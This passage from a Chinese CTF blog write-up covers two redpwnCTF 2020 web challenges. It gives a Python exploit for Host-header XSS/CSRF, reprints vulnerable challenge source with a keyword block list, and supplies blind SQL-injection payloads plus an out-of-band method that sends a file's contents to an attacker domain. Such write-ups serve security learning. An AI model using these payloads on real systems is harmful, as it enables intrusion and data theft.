+<p>源码中viper.ejs（EJS 是一套简单的模板语言，帮你利用普通的 JavaScript 代码生成 HTML 页面。），也就是页面的模板中两个地方是可变的地方<code> &lt;%= name %&gt;  &lt;%- analyticsUrl %&gt;</code>。</p>
+<p>在ejs中，参考 <a target="_blank" rel="noopener" href="https://ejs.bootcss.com/#install">https://ejs.bootcss.com/#install</a></p>
+<p><code>&lt;%=</code> 输出数据到模板（输出是转义 HTML 标签）</p>
+<p><code>&lt;%-</code> 输出非转义的数据到模板</p>
+<p>也就是name会被转义，analyticsUrl不会，所以analyticsUrl可能会有xss</p>
+<pre><code class="hljs prolog">analyticsUrl: <span class="hljs-string">&#x27;http://&#x27;</span> + req.headers[<span class="hljs-string">&#x27;host&#x27;</span>] + <span class="hljs-string">&#x27;/analytics?ip_address=&#x27;</span> + req.headers[<span class="hljs-string">&#x27;x-real-ip&#x27;</span>]</code></pre>
+
+<p>analyticsUrl由<code>req.headers[&#39;host&#39;]</code>传入，要怎么构造捏</p>
+<p>我们需要xss让admin访问<code>http://2020.redpwnc.tf:31291/admin/create?viperId=&#123;&#125;&amp;csrfToken=&#123;&#125;</code>也就是需要把这个构造到host里面，有几个坑</p>
+<ol>
+<li><code>/</code>不能传入host</li>
+<li><code>csrfToken</code>未知</li>
+<li>有csp</li>
+<li><code>&amp;</code>被html编码</li>
+</ol>
+<p>第一个直接用反斜杠代替就好，需要传入的<code>csrfToken</code>，访问<code>http://2020.redpwnc.tf:31291/analytics?ip_address=__csrftoken__admin_account</code>获取数字base64加密后就是<code>csrfToken</code>。绕csp的话可以利用<code>analytics.js</code>,只有一行</p>
+<pre><code class="hljs javascript">fetch(<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;analyticsUrl&quot;</span>).innerHTML)</code></pre>
+
+<p>fetch可以请求网址，正好可以用来csrf。最后因为要传两个参需要<code>&amp;</code>,但是<code>innerHTML</code>提取时<code>&amp;</code>会被解析，使用注释符号包裹<code>innerHTML</code>提取就不会解析<code>&amp;</code>了。</p>
+<p>最后构造的host</p>
+<pre><code class="hljs xml">Host: 2020.redpwnc.tf:31291\admin\create?x=<span class="hljs-comment">&lt;!--&amp;viperId=AAAAAAAA-AAAA-4AAA-8AAA-AAAAAAAAAAAA&amp;csrfToken=&lt;BASE64 encoded token&gt;#--&gt;</span></code></pre>
+
+<p>exp</p>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> requests, socket, re
+<span class="hljs-keyword">import</span> uuid
+<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote
+<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode
+
+HOST, PORT = <span class="hljs-string">&quot;2020.redpwnc.tf&quot;</span>, <span class="hljs-number">31291</span>
+<span class="hljs-comment">#HOST, PORT = &quot;localhost&quot;, 31337</span>
+
+ADMIN_VIPER = <span class="hljs-built_in">str</span>(uuid.uuid4())
+
+<span class="hljs-comment"># Create new viper and fetch cookie and Viper ID</span>
+r = requests.get(<span class="hljs-string">&quot;http://&#123;&#125;:&#123;&#125;/create&quot;</span>.<span class="hljs-built_in">format</span>(HOST,PORT), allow_redirects=<span class="hljs-literal">False</span>)
+viper_id = re.findall(<span class="hljs-string">&quot;([a-f0-9]&#123;8&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;12&#125;)&quot;</span>, r.text)[<span class="hljs-number">0</span>]
+sessid = r.cookies[<span class="hljs-string">&quot;connect.sid&quot;</span>]
+cookies = &#123;<span class="hljs-string">&quot;connect.sid&quot;</span> : sessid&#125;
+
+<span class="hljs-comment"># Get the csrf token</span>
+r = requests.get(<span class="hljs-string">&quot;http://&#123;&#125;:&#123;&#125;/analytics?ip_address=__csrftoken__admin_account&quot;</span>.<span class="hljs-built_in">format</span>(HOST, PORT))
+csrftoken = quote(b64encode(r.text.split()[-<span class="hljs-number">2</span>].encode()))
+
+<span class="hljs-comment"># Inject host header</span>
+payload = <span class="hljs-string">&quot;&quot;</span>
+payload += <span class="hljs-string">&quot;GET /viper/&#123;&#125; HTTP/1.1\r\n&quot;</span>.<span class="hljs-built_in">format</span>(viper_id)
+payload += <span class="hljs-string">&quot;Host: &#123;&#125;:&#123;&#125;\\admin\\create?x=&lt;!--&amp;viperId=&#123;&#125;&amp;csrfToken=&#123;&#125;#--&gt;\r\n&quot;</span>.<span class="hljs-built_in">format</span>(HOST, PORT, ADMIN_VIPER, csrftoken)
+payload += <span class="hljs-string">&quot;Accept: */*\r\n&quot;</span>
+payload += <span class="hljs-string">&quot;Cookie: connect.sid=&#123;&#125;\r\n&quot;</span>.<span class="hljs-built_in">format</span>(sessid)
+payload += <span class="hljs-string">&quot;\r\n&quot;</span>
+
+s = socket.socket()
+s.connect((HOST, PORT))
+s.sendall(payload.encode())
+print(s.recv(<span class="hljs-number">32768</span>))
+s.close()
+
+<span class="hljs-comment"># Cache request</span>
+r = requests.get(<span class="hljs-string">&quot;http://&#123;&#125;:&#123;&#125;/viper/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(HOST, PORT, viper_id), cookies=cookies)
+print(r.text)
+
+print(<span class="hljs-string">&quot;Send this URL to the admin&quot;</span>)
+print(<span class="hljs-string">&quot;http://&#123;&#125;:&#123;&#125;/viper/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(HOST, PORT, viper_id))
+
+<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+    <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nClick to continue fetching http://&#123;&#125;:&#123;&#125;/viper/&#123;&#125; ... &quot;</span>.<span class="hljs-built_in">format</span>(HOST, PORT, ADMIN_VIPER))
+    r = requests.get(<span class="hljs-string">&quot;http://&#123;&#125;:&#123;&#125;/viper/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(HOST, PORT, ADMIN_VIPER), cookies=cookies)
+    print(r.text)</code></pre>
+
+<p>提交网址后在访问下admin创建的页面就能看到flag了</p>
+<p><img src="https://s1.ax1x.com/2020/07/03/Njr7OH.png" srcset="/img/loading.gif" alt="Njr7OH.png"></p>
+<p>参考: <a target="_blank" rel="noopener" href="https://ctftime.org/writeup/21819">https://ctftime.org/writeup/21819</a></p>
+<h2 id="web-got-stacks"><a href="#web-got-stacks" class="headerlink" title="web/got-stacks"></a>web/got-stacks</h2><blockquote>
+<p>This website has great products! Thankfully there are enough products to go around; I’m tryna burn some mad stacks for you all.</p>
+<p>Site: <a target="_blank" rel="noopener" href="https://got-stacks.2020.redpwnc.tf/">got-stacks.2020.redpwnc.tf</a></p>
+</blockquote>
+<p>题目是一个类似商品页，可以注测用户，同样也给了源码</p>
+<pre><code class="hljs javascript"><span class="hljs-meta">&quot;use strict&quot;</span>;
+
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment"> *  @REDPWNCTF 2020</span>
+<span class="hljs-comment"> *  @AUTHOR Jim</span>
+<span class="hljs-comment"> */</span>
+
+<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);
+<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;body-parser&quot;</span>);
+<span class="hljs-keyword">const</span> mysql = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;mysql&quot;</span>);
+<span class="hljs-keyword">const</span> request = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;request&quot;</span>);
+<span class="hljs-keyword">const</span> url = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;url&quot;</span>);
+<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);
+
+<span class="hljs-keyword">const</span> conn = mysql.createConnection(&#123;
+    host: <span class="hljs-string">&quot;127.0.0.1&quot;</span>,
+    port: <span class="hljs-string">&quot;3306&quot;</span>,
+    user: <span class="hljs-string">&quot;redpwnuser&quot;</span>,
+    password: <span class="hljs-string">&quot;redpwnpassword&quot;</span>,
+    database: <span class="hljs-string">&quot;gotstacks&quot;</span>,
+    multipleStatements: <span class="hljs-string">&quot;true&quot;</span>
+&#125;);
+
+conn.connect(&#123; <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>)</span>&#123;
+        <span class="hljs-keyword">if</span>(err)&#123;
+            <span class="hljs-keyword">throw</span> err;
+        &#125;<span class="hljs-keyword">else</span>&#123;
+            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;mysql connection success&quot;</span>);
+        &#125;
+    &#125;
+&#125;);
+
+<span class="hljs-keyword">const</span> KEYWORDS = [
+    <span class="hljs-string">&quot;union&quot;</span>,
+    <span class="hljs-string">&quot;and&quot;</span>,
+    <span class="hljs-string">&quot;or&quot;</span>,
+    <span class="hljs-string">&quot;sleep&quot;</span>,
+    <span class="hljs-string">&quot;hex&quot;</span>,
+    <span class="hljs-string">&quot;char&quot;</span>,
+    <span class="hljs-string">&quot;db&quot;</span>,
+    <span class="hljs-string">&quot;\\\\&quot;</span>,
+    <span class="hljs-string">&quot;/&quot;</span>,
+    <span class="hljs-string">&quot;*&quot;</span>,
+    <span class="hljs-string">&quot;load_file&quot;</span>,
+    <span class="hljs-string">&quot;0x&quot;</span>,
+    <span class="hljs-string">&quot;fl&quot;</span>,
+    <span class="hljs-string">&quot;ag&quot;</span>,
+    <span class="hljs-string">&quot;txt&quot;</span>,
+    <span class="hljs-string">&quot;if&quot;</span>
+];
+
+<span class="hljs-keyword">const</span> waf = <span class="hljs-function">(<span class="hljs-params">str</span>) =&gt;</span> &#123;
+    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">const</span> i <span class="hljs-keyword">in</span> KEYWORDS)&#123;
+        <span class="hljs-keyword">const</span> key = KEYWORDS[i];
+        <span class="hljs-keyword">if</span>(str.toLowerCase().indexOf(key) !== -<span class="hljs-number">1</span>)&#123;
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+        &#125;
+    &#125;
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+&#125;
+
+<span class="hljs-keyword">const</span> isValid = <span class="hljs-function">(<span class="hljs-params">ip</span>) =&gt;</span> &#123;
+    <span class="hljs-keyword">if</span> (<span class="hljs-regexp">/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/</span>.test(ip))&#123;
+      <span class="hljs-keyword">return</span> (<span class="hljs-literal">true</span>)
+    &#125;
+  <span class="hljs-keyword">return</span> (<span class="hljs-literal">false</span>)
+&#125;
+
+<span class="hljs-keyword">const</span> isPrivate = <span class="hljs-function">(<span class="hljs-params">ip</span>) =&gt;</span> &#123;
+    <span class="hljs-keyword">const</span> parts = ip.split(<span class="hljs-string">&quot;.&quot;</span>);
+    <span class="hljs-keyword">return</span> parts[<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;10&#x27;</span> || 
+    (parts[<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;172&#x27;</span> &amp;&amp; (<span class="hljs-built_in">parseInt</span>(parts[<span class="hljs-number">1</span>], <span class="hljs-number">10</span>) &gt;= <span class="hljs-number">16</span> &amp;&amp; <span class="hljs-built_in">parseInt</span>(parts[<span class="hljs-number">1</span>], <span class="hljs-number">10</span>) &lt;= <span class="hljs-number">31</span>)) || 
+    (parts[<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;192&#x27;</span> &amp;&amp; parts[<span class="hljs-number">1</span>] === <span class="hljs-string">&#x27;168&#x27;</span>);
+&#125;
+
+<span class="hljs-keyword">const</span> app = express();
+
+app.use(express.static(__dirname + <span class="hljs-string">&quot;/public&quot;</span>));
+app.use(bodyParser.json());
+
+app.post(<span class="hljs-string">&quot;/api/initializedb&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;
+    <span class="hljs-keyword">const</span> body = req.body;
+    <span class="hljs-keyword">if</span>(body.hasOwnProperty(<span class="hljs-string">&quot;filename&quot;</span>))&#123;
+        <span class="hljs-keyword">if</span>(!fs.readdirSync(<span class="hljs-string">&#x27;db&#x27;</span>).includes(body.filename)) <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;File not found&quot;</span>);
+        <span class="hljs-keyword">try</span>&#123;
+            <span class="hljs-keyword">const</span> sql = fs.readFileSync(<span class="hljs-string">&quot;db/&quot;</span> + body.filename).toString();
+            conn.query(sql, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">error, results, fields</span>)</span>&#123;
+                res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">&quot;Success! Database has been intialized&quot;</span>);
+            &#125;);
+        &#125; <span class="hljs-keyword">catch</span>(err)&#123;
+            <span class="hljs-keyword">if</span>(err.code = <span class="hljs-string">&quot;EOENT&quot;</span>)&#123;
+                res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;File not found&quot;</span>);
+            &#125;<span class="hljs-keyword">else</span>&#123;
+                res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Bad request&quot;</span>);
+            &#125;
+        &#125;
+    &#125;<span class="hljs-keyword">else</span>&#123;
+        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Bad request&quot;</span>);
+    &#125;
+&#125;);
+
+app.post(<span class="hljs-string">&quot;/api/registerproduct&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;
+    <span class="hljs-keyword">const</span> body = req.body;
+    <span class="hljs-keyword">if</span>(body.hasOwnProperty(<span class="hljs-string">&quot;stockid&quot;</span>) &amp;&amp; body.hasOwnProperty(<span class="hljs-string">&quot;name&quot;</span>) &amp;&amp; body.hasOwnProperty(<span class="hljs-string">&quot;quantity&quot;</span>) &amp;&amp; body.hasOwnProperty(<span class="hljs-string">&quot;vurl&quot;</span>))&#123;
+        <span class="hljs-keyword">if</span>(!(waf(body.stockid) || waf(body.name) || waf(body.quantity) || waf(body.vurl)))&#123;
+
+            <span class="hljs-keyword">let</span> query = <span class="hljs-string">&quot;SELECT * FROM stock WHERE stockid = ? LIMIT 1&quot;</span>;
+
+            conn.query(query, [req.body.stockid], <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">error, results, fields</span>)</span>&#123;
+                <span class="hljs-keyword">if</span> (error)&#123;
+                    res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Internal server error&quot;</span>);
+                    <span class="hljs-keyword">return</span>;
+                &#125;
+    
+                <span class="hljs-keyword">if</span>(results.length &gt; <span class="hljs-number">0</span>)&#123;
+                    res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;stockID already exists&quot;</span>);
+                    <span class="hljs-keyword">return</span>;
+                &#125;<span class="hljs-keyword">else</span>&#123;
+                    query = <span class="hljs-string">&quot;INSERT INTO stock (stockid, name, quantity, vurl) VALUES (&quot;</span> + body.stockid + <span class="hljs-string">&quot;, &#x27;&quot;</span> + body.name + <span class="hljs-string">&quot;&#x27;, &quot;</span> + body.quantity + <span class="hljs-string">&quot;, &#x27;&quot;</span> + body.vurl + <span class="hljs-string">&quot;&#x27;);&quot;</span>;
+
+                    conn.query(query, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">error, results, fields</span>)</span>&#123;
+                        res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">&quot;Success! Record was created&quot;</span>);
+                    &#125;);
+                &#125;
+            &#125;);
+        &#125;<span class="hljs-keyword">else</span>&#123;
+            res.status(<span class="hljs-number">403</span>).send(<span class="hljs-string">&quot;Hacking attempt detected&quot;</span>);
+        &#125;
+    &#125;<span class="hljs-keyword">else</span>&#123;
+        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Bad request&quot;</span>);
+    &#125;
+&#125;);
+
+app.post(<span class="hljs-string">&quot;/api/notifystock&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>)</span>&#123;
+    <span class="hljs-keyword">const</span> body = req.body;
+    <span class="hljs-keyword">if</span>(body.hasOwnProperty(<span class="hljs-string">&quot;stockid&quot;</span>))&#123;
+        <span class="hljs-keyword">let</span> query = <span class="hljs-string">&quot;SELECT * FROM stock WHERE stockid = ? LIMIT 1&quot;</span>;
+
+        conn.query(query, [req.body.stockid], <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">error, results, fields</span>)</span>&#123;
+            <span class="hljs-keyword">if</span> (error)&#123;
+                res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Internal server error&quot;</span>);
+                <span class="hljs-keyword">return</span>;
+            &#125;
+
+            <span class="hljs-keyword">if</span>(results.length &gt; <span class="hljs-number">0</span>)&#123;
+                <span class="hljs-keyword">if</span>(results[<span class="hljs-number">0</span>].quantity &gt; <span class="hljs-number">0</span>)&#123;
+                    res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Stock is not empty!&quot;</span>);
+                &#125;<span class="hljs-keyword">else</span>&#123;
+                    <span class="hljs-keyword">if</span>(isValid(results[<span class="hljs-number">0</span>].vurl.split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">0</span>]) &amp;&amp; isPrivate(results[<span class="hljs-number">0</span>].vurl.split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">0</span>]))&#123;
+                        <span class="hljs-keyword">try</span> &#123;
+                            request.get(<span class="hljs-string">&quot;http://&quot;</span> + results[<span class="hljs-number">0</span>].vurl);
+                        &#125; <span class="hljs-keyword">catch</span>(err)&#123;
+                            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;get request failed&quot;</span>);
+                        &#125;
+                        res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">&quot;Thank you! The vendor has been notified&quot;</span>);
+                    &#125;<span class="hljs-keyword">else</span>&#123;
+                        <span class="hljs-keyword">let</span> options = &#123;
+                            url: <span class="hljs-string">&quot;https://dns.google.com/resolve?name=&quot;</span> + results[<span class="hljs-number">0</span>].vurl.split(<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;&amp;type=A&quot;</span>,
+                            method: <span class="hljs-string">&quot;GET&quot;</span>,
+                            headers: &#123;
+                                <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>
+                            &#125;
+                        &#125;
+
+                        request(options, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, dnsRes, body</span>)</span>&#123;
+                            <span class="hljs-keyword">let</span> jsonRes;
+                            <span class="hljs-keyword">try</span> &#123;
+                                jsonRes = <span class="hljs-built_in">JSON</span>.parse(body);
+                            &#125;<span class="hljs-keyword">catch</span>(err)&#123;
+                                res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Bad request body&quot;</span>);
+                                <span class="hljs-keyword">return</span>;
+                            &#125;
+                            <span class="hljs-keyword">try</span> &#123;
+                                <span class="hljs-keyword">const</span> ip = jsonRes[<span class="hljs-string">&quot;Answer&quot;</span>][<span class="hljs-number">0</span>][<span class="hljs-string">&quot;data&quot;</span>];
+                                <span class="hljs-keyword">if</span>(isPrivate(ip))&#123;
+                                    <span class="hljs-keyword">try</span>&#123;
+                                        request.get(<span class="hljs-string">&quot;http://&quot;</span> + results[<span class="hljs-number">0</span>].vurl);
+                                    &#125; <span class="hljs-keyword">catch</span>(err)&#123;
+                                        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;get request failed&quot;</span>);
+                                    &#125;
+                                    res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">&quot;Thank you! The vendor has been notified&quot;</span>);
+                                &#125;<span class="hljs-keyword">else</span>&#123;
+                                    res.status(<span class="hljs-number">403</span>).send(<span class="hljs-string">&quot;Thank you! But the address the vendor provided is improper, we will let them know next time we see them&quot;</span>);
+                                &#125;
+                            &#125;<span class="hljs-keyword">catch</span>(err)&#123;
+                                res.status(<span class="hljs-number">403</span>).send(<span class="hljs-string">&quot;Thank you! But the address the vendor provided is improper, we will let them know next time we see them&quot;</span>);
+                            &#125;
+                        &#125;)
+                    &#125;
+                &#125;
+            &#125;<span class="hljs-keyword">else</span>&#123;
+                res.status(<span class="hljs-number">404</span>).send(<span class="hljs-string">&quot;Stockid not found&quot;</span>);
+            &#125;
+        &#125;);
+    &#125;<span class="hljs-keyword">else</span>&#123;
+        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Bad request&quot;</span>);
+    &#125;
+&#125;);
+
+app.listen(<span class="hljs-number">31337</span>, <span class="hljs-function">() =&gt;</span> &#123;
+    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;express listening on 31337&quot;</span>);
+&#125;);</code></pre>
+
+<p>看过滤的KEYWORDS就大概可以猜出有注入，在insert那有注入，几个参数都可控，都是注册传入的参数。flag从给的源码压缩包中的dockerfile看是要<code>load_file</code>读<code>/home/ctf/flag.txt</code>，但是几个关键字都给过滤了。这里用预编译语句+16进制，或者用base64绕过这些过滤，有两种方法做接下来，一种外带回显，一种时间盲注。</p>
+<p>先说简单的时间盲注</p>
+<pre><code class="hljs json"># (select if((select substr(load_file(&#x27;/home/ctf/flag.txt&#x27;),1,1)) like binary &#x27;f&#x27;,sleep(6),1))
+
+&#123;<span class="hljs-attr">&quot;stockid&quot;</span>:<span class="hljs-string">&quot;2555&quot;</span>,<span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-attr">&quot;quantity&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-attr">&quot;vurl&quot;</span>:<span class="hljs-string">&quot;sf&#x27;); set @s=(select from_base64(&#x27;c2VsZWN0IGlmKChzZWxlY3Qgc3Vic3RyKGxvYWRfZmlsZSgnL2hvbWUvY3RmL2ZsYWcudHh0JyksMSwxKSkgbGlrZSBiaW5hcnkgJ2YnLHNsZWVwKDYpLDEp&#x27;));PREPARE gsgs FROM @s;EXECUTE gsgs;#&quot;</span>&#125;
+
+&#123;<span class="hljs-attr">&quot;stockid&quot;</span>:<span class="hljs-string">&quot;2560&quot;</span>,<span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-attr">&quot;quantity&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-attr">&quot;vurl&quot;</span>:<span class="hljs-string">&quot;sf&#x27;); set @s=(select x&#x27;73656c656374206966282873656c65637420737562737472286c6f61645f66696c6528272f686f6d652f6374662f666c61672e74787427292c312c312929206c696b652062696e617279202766272c736c6565702836292c3129&#x27;);PREPARE gsgs FROM @s;EXECUTE gsgs;#&quot;</span>&#125;</code></pre>
+
+
+
+<p>预期应该是外带，因为还有个路由可以访问vurl，但是有限制需要绕DNS，使得<code>https://dns.google.com/resolve?name=&#123;vurl&#125;&amp;type=A</code>查询出的结果能过<code>const isPrivate</code> ，即data为192.168开头。</p>
+<p>利用<a target="_blank" rel="noopener" href="http://xip.io/">http://xip.io/</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.192.168.1.1.xip.io会解析到192.168.1.1/">www.192.168.1.1.xip.io会解析到192.168.1.1</a></p>
+<p>nodejs中</p>
+<p>request.get(‘http://域名:<a target="_blank" rel="noopener" href="http://www.192.168.1.1.xip.io&/#39;">www.192.168.1.1.xip.io&#39;</a>) 会访问到域名，域名绑定到服务器，起个服务监听会显示访问记录</p>
+<p>而且<code>https://dns.google.com/resolve?name=域名:www.192.168.1.1.xip.io&amp;type=A</code>显示的data为192.168.1.1满足条件</p>
+<p>即要写入的<code>vurl</code>为</p>
+<pre><code class="hljs reasonml">concat(&#x27;域名:www.<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>.xip.io&#x27;,<span class="hljs-constructor">LOAD_FILE(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">home</span><span class="hljs-operator">/</span><span class="hljs-params">ctf</span><span class="hljs-operator">/</span>ﬂ<span class="hljs-params">ag</span>.<span class="hljs-params">txt</span>&#x27;)</span>)</code></pre>
+
+<p>访问时就会带出flag,把下面语句base64或者16进制套到预编译语句里面，在访问<code>/api/notifystock </code>传入{“stockid”:”2333”}，服务器上应该有回显</p>
+<pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> stock (stockid, <span class="hljs-keyword">name</span>, quantity, vurl) <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">2333</span>, <span class="hljs-string">&#x27;aa&#x27;</span>, <span class="hljs-number">22</span>, <span class="hljs-keyword">concat</span>(<span class="hljs-string">&#x27;域名:www.192.168.1.1.xip.io&#x27;</span>,<span class="hljs-keyword">LOAD_FILE</span>(<span class="hljs-string">&#x27;/home/ctf/ﬂag.txt&#x27;</span>)));</code></pre>
+
+
+
+<p>参考: <a target="_blank" rel="noopener" href="https://ctftime.org/task/12160">https://ctftime.org/task/12160</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/redpwnCTF2020/">redpwnCTF2020</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/07/08/SCTF/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SCTF2020</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/06/28/%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-laravel/">
+                        <span class="hidden-mobile">[护网杯 2018]easy_laravel</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
